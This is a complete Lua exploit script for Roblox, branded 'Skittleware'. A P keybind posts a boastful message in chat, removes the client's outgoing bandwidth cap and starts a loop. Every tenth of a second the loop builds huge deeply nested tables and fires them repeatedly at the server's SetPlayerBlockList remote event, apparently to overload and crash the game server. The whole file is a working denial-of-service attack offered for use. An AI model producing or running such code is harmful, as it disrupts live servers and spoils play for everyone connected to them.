local phrases = {"Exploits wield the power to challenge authority and tip the balance of control. - Skittleware"}

local isEnabled = false
local toggleKey = Enum.KeyCode.P

local function toggleBomb()
    isEnabled = not isEnabled
    if isEnabled then
        warn("Skittleware | enabled.")
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(phrases[1], "All")
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
    end
end

game:GetService('UserInputService').InputBegan:Connect(function(input, gameProcessedEvent)
    if input.KeyCode == toggleKey and not gameProcessedEvent then
        toggleBomb()
    end
end)

local function getmaxvalue(val)
    if type(val) ~= "number" then
        return nil
    end
    return 499999 / (val + 2)
end

local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}

    table.insert(spammedtable, {})

    for i = 1, tableincrease do
        local tableins = {}
        table.insert(spammedtable[1], tableins)
        spammedtable[1] = tableins
    end

    for i = 1, getmaxvalue(tableincrease) or 999999 do
        table.insert(maintable, spammedtable)
    end

    for i = 1, tries do
        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
    end
end

while true do
    if isEnabled then
        bomb(99, 5)
    end
    wait(0.1)
end
